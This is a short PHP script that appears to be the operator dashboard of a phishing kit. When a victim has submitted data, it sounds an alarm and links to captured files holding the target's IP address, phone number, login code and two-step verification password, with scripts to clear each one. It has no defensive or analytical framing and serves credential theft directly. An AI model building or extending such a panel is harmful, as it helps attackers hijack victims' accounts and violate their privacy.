<?php
if(file_exists("ip"))
{
	echo '<audio controls autoplay><source src="https://dl4.fara-download.ir/audio/sound_effect/alarms/red/red%20danger%20alarm%202_2.mp3"></source></audio>';
    echo '<h3><a href="ip">IP</a><br/><h3><a href="phone_number">PhoneNumber</a><br/><br/><a href="2level">2level</a><br/><br/><a href="code">Code</a><br/><br/><a href="cleanip.php">Clean IP</a><br/><br/><a href="cleannum.php">Clean PhoneNumber</a><br/><br/><a href="clean2lvl.php">Clean 2level</a><br/><br/><a href="cleancde.php">Clean Code</a><br/></h3>';
}
else
{
    header("Refresh:3");
    echo "Target Not Entered.";
}
?>
